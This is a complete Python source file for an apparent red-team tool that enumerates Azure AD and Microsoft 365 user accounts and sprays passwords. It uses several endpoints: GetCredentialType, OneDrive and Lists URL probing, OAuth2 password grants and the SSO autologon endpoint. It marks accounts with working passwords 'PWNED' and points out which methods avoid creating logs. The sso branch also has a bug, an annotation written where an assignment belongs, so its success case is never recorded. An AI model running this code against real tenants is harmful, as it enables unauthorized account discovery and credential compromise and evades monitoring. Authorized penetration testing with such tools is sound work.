#!/usr/bin/python3

'''
Copyright (C) 2022 Cody Martin BLSOPS LLC

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
'''

import sys
import argparse
import time
import json
import uuid
from datetime import datetime
from datetime import timezone
from datetime import timedelta
import xml.etree.ElementTree as ET
import colorama
import requests

# Set up our colors
colorama.init()
SUCCESS = colorama.Fore.GREEN
VALID = colorama.Fore.CYAN
DANGER = colorama.Fore.RED
WARNING = colorama.Fore.YELLOW
RESET = colorama.Style.RESET_ALL

# Set up argparse stuff
METHODS = [
	'normal',
	'onedrive',
	'lists',
	'login',
	'sso'
]

DESCRIPTION = f'''
  =====================================================================================
  # This module will enumerate for valid user accounts in an Azure AD environment     #
  # There are five methods to enumerate with: login, sso, normal, onedrive, lists     #
  #                                                                                   #
  # Default method: normal                                                            #
  #                                                                                   #
  # You may supply either a single username to test, or a user list                   #
  # Supplying a password will insert it into either the 'login' or 'sso' method       #
  #                                                                                   #
  # If the password is correct, and there are no other obstacles, then the account    #
  # will be marked 'PWNED'                                                            #
  #                                                                                   #
  #{DANGER} Using the 'login' method will create failed authentication logs in Azure AD {RESET}      #
  #                                                                                   #
  #{WARNING} Using the 'sso' 'lists' or 'onedrive' methods will not create any logs,{RESET}           #
  #{WARNING} but is less accurate{RESET}                                                              #
  =====================================================================================
'''

def enumerate_tenant_domains(domain, user_agent='AutodiscoverClient'):
	"""Given a domain and optional user_agent, returns domains under shared tenant"""
	headers = {
		'Content-Type': 'text/xml; charset=utf-8',
		'SOAPAction': '"http://schemas.microsoft.com/exchange/2010' \
			'/Autodiscover/Autodiscover/GetFederationInformation"',
		'User-Agent': user_agent
	}

	xml = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<soap:Header>
		<a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
		<a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>
		<a:ReplyTo>
			<a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		</a:ReplyTo>
	</soap:Header>
	<soap:Body>
		<GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
			<Request>
				<Domain>{domain}</Domain>
			</Request>
		</GetFederationInformationRequestMessage>
	</soap:Body>
</soap:Envelope>'''

	endpoint = 'https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc'

	# Get Tenant Domains with Supplied Domain
	# Returns a SOAP Envelope object
	# Loops until we receive valid data
	proceed = False
	while not proceed:
		tenant_domains = requests.post(endpoint, data=xml, headers=headers)
		if tenant_domains.status_code == 421:
			return None
		tenant_domains.encoding = 'utf-8'
		try:
			xml_response = ET.fromstring(str(tenant_domains.content, 'utf-8'))
			proceed = True
		except ET.ParseError:
			continue

	domains = []

	for i in xml_response[1][0][0][3]:
		domains.append(i.text)

	return domains

def find_tenant_name(email, target):
	"""Given an email account and application to target, will return the valid tenant name"""
	if target == 'onedrive':
		page = 'onedrive.aspx'
	elif target == 'lists':
		page = 'Lists.aspx'
	else:
		print(f'{DANGER}[!]{RESET} Something crazy happened - Exiting')
		sys.exit()
	domain = email.split('@')[1]
	user_domain_1 = email.replace('@','_').replace('.','_')
	domain_list = enumerate_tenant_domains(domain)
	tenant_names = []
	valid_tenant_name = None
	for entry in domain_list:
		if '.onmicrosoft.com' in entry:
			tenant_names.append(entry.split('.')[0])
	if len(tenant_names) > 1:
		print(f'{VALID}[-]{RESET} Attempting to find the correct tenant name')
		print(f'{VALID}[-]{RESET} This might take a little while depending' \
			f' on the number of potential tenant names ({len(tenant_names)})')
		print()
		for tenant_name in tenant_names[::-1]:
			endpoint = f'https://{tenant_name}-my.sharepoint.com/personal/{user_domain_1}/' \
				f'_layouts/15/{page}'
			try:
				requests.head(endpoint, timeout=10)
				valid_tenant_name = tenant_name
				print(f'{VALID}[+]{RESET} Tenant Name: {valid_tenant_name}')
				print()
				break
			except requests.exceptions.ConnectTimeout:
				pass
	elif len(tenant_names) == 1:
		valid_tenant_name = tenant_names[0]
	return valid_tenant_name

def main():
	"""
	Main runner function. Takes in a username or list of users
	and attempts to brute-force check for user existence.

	Can also take in a password to be used with 'login' or
	'autologon' methods to perform password spray
	"""
	arg_parser = argparse.ArgumentParser(prog='user_enum.py',
							usage=SUCCESS + '%(prog)s' + RESET + ' [-m login-method | '\
								'-u username | -i input-list | -o outfile]',
							description=DESCRIPTION,
							formatter_class=argparse.RawDescriptionHelpFormatter)
	arg_parser.add_argument('-m',
							'--method',
							metavar='<method>',
							dest='method',
							type=str,
							help=f'The login method you would like to use (default is normal), select one '\
										f'of {str(METHODS).replace(","," ").replace("[","").replace("]","")}',
							choices=METHODS,
							required=False)
	arg_parser.add_argument('-u',
							'--username',
							metavar='<test@domain.com>',
							dest='username',
							type=str,
							help='The username you would like to test',
							required=False)
	arg_parser.add_argument('-i',
							'--input-list',
							metavar='</path/to/usernames.txt>',
							dest='input_list',
							type=str,
							help='Text file containing usernames you want to test',
							required=False)
	arg_parser.add_argument('-p',
							'--password',
							metavar='<password>',
							dest='password',
							type=str,
							help='The password you want to spray with. Only works with '\
										'\'login\' and \'sso\' methods.',
							required=False)
	arg_parser.add_argument('-o',
							'--outfile',
							metavar='</path/to/output/directory/>',
							dest='outfile_path',
							type=str,
							help='Path to where you want to save your results',
							required=False)

	args = arg_parser.parse_args()

	if args.method is None:
		args.method = 'normal'

	# Set a default outfile if none is given
	outfile_path = args.outfile_path
	if outfile_path is None:
		outfile = './' + time.strftime('%Y-%m-%d_%H-%M-%S_User-Enum.json')
	else:
		if outfile_path[-1] != '/':
			outfile_path = outfile_path + '/'
		outfile = outfile_path + time.strftime('%Y-%m-%d_%H-%M-%S_User-Enum.json')

	if args.username is not None:
		# Single user mode
		userlist = [args.username]
	elif args.input_list is not None:
		# We better be loading from a list
		with open(args.input_list, encoding='UTF-8') as userfile:
			userlist = []
			for user in userfile.readlines():
				userlist.append(user.replace('\n', ''))
	else:
		# No users supplied
		print(f'{WARNING}No users supplied with either -u or -i\n{DANGER}Exiting{RESET}')
		sys.exit()

	if args.password is None:
		password = 'none'
		client_id = str(uuid.uuid4())
	else:
		password = args.password
		client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'

	results = []

	if args.method == 'normal':
		for user in userlist:
			data = {
				'username': user,
				'isOtherIdpSupported': 'true',
				'checkPhones': 'true',
				'isRemoteNGCSupported': 'false',
				'isCookieBannerShown': 'false',
				'isFidoSupported': 'false',
				'originalRequest': '',
				'flowToken': ''
			}

			json_data = json.dumps(data)

			headers = {
				'Content-Type': 'application/json; charset=utf-8',
			}

			endpoint = 'https://login.microsoftonline.com/common/GetCredentialType'

			json_response = requests.post(endpoint, headers=headers, data=json_data).json()

			if json_response['ThrottleStatus'] == 1:
				print(f'{WARNING}Requests being throttled.{RESET}')
				exists = '???'
			else:
				if json_response['IfExistsResult'] == 0 or json_response['IfExistsResult'] == 6:
					exists = 'VALID_USER'
				else:
					exists = 'INVALID_USER'

			results.append({
				'account': user,
				'exists': exists
			})

	elif args.method == 'onedrive':
		print(f'{WARNING}[!]{RESET} This will only discover accounts that have M365 licenses')
		valid_tenant_name = find_tenant_name(userlist[0], args.method)
		if valid_tenant_name:
			for user in userlist:
				user_domain = user.replace('@','_').replace('.','_')
				onedrive_endpoint = f'https://{valid_tenant_name}-my.sharepoint.com' \
					f'/personal/{user_domain}/_layouts/15/onedrive.aspx'
				user_check = requests.get(onedrive_endpoint)
				user_check_status = user_check.status_code
				exists = 'INVALID_USER'
				if user_check_status in [200, 302, 401, 403]:
					exists = 'VALID_USER'
				results.append({
						'account': user,
						'exists': exists
				})
		else:
			print(f'{WARNING}[?]{RESET} Valid tenant name was not determined. Exiting.')
			sys.exit()

	elif args.method == 'lists':
		print(f'{WARNING}[!]{RESET} This will only discover accounts that have M365 licenses')
		valid_tenant_name = find_tenant_name(userlist[0], args.method)
		if valid_tenant_name:
			for user in userlist:
				user_domain = user.replace('@','_').replace('.','_')
				lists_endpoint = f'https://{valid_tenant_name}-my.sharepoint.com' \
					f'/personal/{user_domain}/_layouts/15/Lists.aspx'
				user_check = requests.get(lists_endpoint)
				user_check_status = user_check.status_code
				exists = 'INVALID_USER'
				if user_check_status in [200, 302, 401, 403]:
					exists = 'VALID_USER'
				results.append({
						'account': user,
						'exists': exists
				})
		else:
			print(f'{WARNING}[?]{RESET} Valid tenant name was not determined. Exiting.')
			sys.exit()

	elif args.method == 'login':
		for user in userlist:
			data = {
				'resource': client_id,
				'client_id': client_id,
				'grant_type': 'password',
				'username': user,
				'password': password,
				'scope': 'openid'
			}

			endpoint = 'https://login.microsoftonline.com/common/oauth2/token'

			headers = {
				'Content-Type': 'application/x-www-form-urlencoded'
			}

			json_response = requests.post(endpoint, headers=headers, data=data).json()

			try:
				if json_response['token_type'] == 'Bearer':
					exists = 'PWNED'
			except KeyError:
				response_code = json_response['error_description'].split(':')[0]
				if response_code == 'AADSTS50053':
					# The account is locked, you've tried to sign in
					# too many times with an incorrect user ID or password.
					exists = 'LOCKED'
				elif response_code == 'AADSTS50126':
					# Error validating credentials due to invalid username or password.
					exists = 'VALID_USER'
				elif response_code in ['AADSTS50076', 'AADSTS50079']:
					# Due to a configuration change made by your administrator, or because you moved to a new
					# location, you must use multi-factor authentication to access
					exists = 'MFA'
				elif response_code == 'AADSTS700016':
					# Application with identifier '{appIdentifier}' was not found in the directory '{tenantName}'.
					# This can happen if the application has not been installed by the administrator of the
					# tenant or consented to by any user in the tenant.
					# You may have sent your authentication request to the wrong tenant.
					exists = 'VALID_USER'
				elif response_code == 'AADSTS50034':
					# The user account {identifier} does not exist in the {tenant} directory.
					# To sign into this application, the account must be added to the directory.
					exists = 'INVALID_USER'
				elif response_code == 'AADSTS50128':
					# Tenant for account does not exist.
					exists = 'INVALID_TENANT'
				elif response_code == 'AADSTS90072':
					# Valid credential, not for this tenant
					exists = 'WRONG_TENANT'
				elif response_code == 'AADSTS50055':
					# User password is expired
					exists = 'EXPIRED_PASS'
				elif response_code == 'AADSTS50131':
					# Login blocked
					exists = 'LOGIN_BLOCKED'
				elif response_code == 'AADSTS50158':
					# Conditional Access
					exists = 'CONDITIONAL_ACCESS'
				elif response_code == 'AADSTS50056':
					# No password
					exists = 'NO_PASS'
				elif response_code == 'AADSTS80014':
					# PTA time exceeded
					exists = 'PTA_EXCEEDED'
				elif response_code == 'AADSTS50057':
					# Account disabled
					exists = 'DISABLED'
				else:
					exists = '???'

			results.append({
				'account': user,
				'exists': exists
			})

	elif args.method == 'sso':
		for user in userlist:
			rand_uuid = client_id
			message_id = str(uuid.uuid4()).upper()
			username_token = str(uuid.uuid4()).upper()

			domain = user.split("@")[1]

			date = datetime.now(timezone.utc)
			created_utc = date.strftime('%Y-%m-%dT%H:%M:%S.%fZ')
			expires_utc = (date + timedelta(minutes=10)).strftime('%Y-%m-%dT%H:%M:%S.%fZ')

			endpoint = f'https://autologon.microsoftazuread-sso.com/{domain}/winauth' \
									f'/trust/2005/usernamemixed?client-request-id={rand_uuid}'

			xml = f'''<?xml version='1.0' encoding='UTF-8'?>
<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
    <s:Header>
        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
        <wsa:To s:mustUnderstand='1'>{endpoint}</wsa:To>
        <wsa:MessageID>urn:uuid:{message_id}</wsa:MessageID>
        <wsse:Security s:mustUnderstand="1">
            <wsu:Timestamp wsu:Id="_0">
                <wsu:Created>{created_utc}</wsu:Created>
                <wsu:Expires>{expires_utc}</wsu:Expires>
            </wsu:Timestamp>
            <wsse:UsernameToken wsu:Id="uuid-{username_token}">
                <wsse:Username>{user}</wsse:Username>
                <wsse:Password>{password}</wsse:Password>
            </wsse:UsernameToken>
        </wsse:Security>
    </s:Header>
    <s:Body>
        <wst:RequestSecurityToken Id='RST0'>
            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
                    </wsa:EndpointReference>
                </wsp:AppliesTo>
                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
        </wst:RequestSecurityToken>
    </s:Body>
</s:Envelope>
'''

			response = requests.post(endpoint, data=xml)
			if response.status_code != 400:
				exists: 'PWNED'
			else:
				xml_response = ET.fromstring(str(response.content, 'utf-8'))
				response_code = xml_response[1][0][2][0][1][1].text.split(':')[0]
				if response_code == 'AADSTS50053':
					# The account is locked, you've tried to sign in
					# too many times with an incorrect user ID or password.
					exists = 'LOCKED'
				elif response_code == 'AADSTS50126':
					# Error validating credentials due to invalid username or password.
					exists = 'VALID_USER'
				elif response_code in ['AADSTS50076', 'AADSTS50079']:
					# Due to a configuration change made by your administrator, or because you moved to a new
					# location, you must use multi-factor authentication to access
					exists = 'MFA'
				elif response_code == 'AADSTS700016':
					# Application with identifier '{appIdentifier}' was not found in the directory '{tenantName}'.
					# This can happen if the application has not been installed by the administrator of the
					# tenant or consented to by any user in the tenant.
					# You may have sent your authentication request to the wrong tenant.
					exists = 'VALID_USER'
				elif response_code == 'AADSTS50034':
					# The user account {identifier} does not exist in the {tenant} directory.
					# To sign into this application, the account must be added to the directory.
					exists = 'INVALID_USER'
				elif response_code == 'AADSTS50128':
					# Tenant for account does not exist.
					exists = 'INVALID_TENANT'
				elif response_code == 'AADSTS90072':
					# Valid credential, not for this tenant
					exists = 'WRONG_TENANT'
				elif response_code == 'AADSTS50055':
					# User password is expired
					exists = 'EXPIRED_PASS'
				elif response_code == 'AADSTS50131':
					# Login blocked
					exists = 'LOGIN_BLOCKED'
				elif response_code == 'AADSTS50158':
					# Conditional Access
					exists = 'CONDITIONAL_ACCESS'
				elif response_code == 'AADSTS50056':
					# No password
					exists = 'NO_PASS'
				elif response_code == 'AADSTS80014':
					# PTA time exceeded
					exists = 'PTA_EXCEEDED'
				elif response_code == 'AADSTS50057':
					# Account disabled
					exists = 'DISABLED'
				else:
					exists = '???'
			results.append({
				'account': user,
				'exists': exists
			})

	for result in results:
		if result['exists'] == 'PWNED':
			print(f'{SUCCESS}[+]{RESET} {result["account"]} : {SUCCESS}{result["exists"]}{RESET}')
		elif result['exists'] == 'VALID_USER':
			print(f'{VALID}[+]{RESET} {result["account"]} : {VALID}{result["exists"]}{RESET}')
		elif result['exists'] in ['INVALID_USER','INVALID_TENANT']:
			print(f'{DANGER}[-]{RESET} {result["account"]} : {DANGER}{result["exists"]}{RESET}')
		else:
			print(f'{WARNING}[?]{RESET} {result["account"]} : {WARNING}{result["exists"]}{RESET}')

	# Write our results out to file
	with open(outfile, 'w+', encoding='UTF-8') as file:
		file.write(json.dumps(results))
		file.close()

if __name__ == '__main__':
	main()
	sys.exit()
